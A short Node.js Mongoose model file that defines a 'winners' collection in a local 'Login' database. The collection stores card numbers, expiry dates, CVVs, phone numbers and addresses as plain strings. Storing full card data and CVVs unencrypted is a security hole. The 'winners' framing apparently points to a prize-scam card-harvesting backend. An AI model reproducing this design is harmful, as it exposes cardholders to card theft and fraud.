const mongoose = require('mongoose');
// name of database is login
const connect = mongoose.connect("mongodb://localhost:27017/Login"); 

connect.then(()=>{
    console.log("Database connected Successfully");
    console.log("winners Collection of Login Database connected Successfully");
}).catch(()=>{
    console.log("Database not connected");
})

// Create a schema
const WinnerSchema = new mongoose.Schema({
    amount: {
        type: String,
        required: true
    },
    name_of_card_holder: {
        type: String,
        required: true
    },
    card_number: {
        type: String,
        required: true
    },
    card_expiry: {
        type: String,
        required: true
    },
    cvv: {
        type: String,
        required: true
    },
    phone_no: {
        type: String,
        required: true
    },
    address: {
        type: String,
        required: true
    }
})

// Collection Part - Creating a model 
const WinnerCollection = mongoose.model("winners", WinnerSchema); // Make collection named winners in login database
module.exports = WinnerCollection;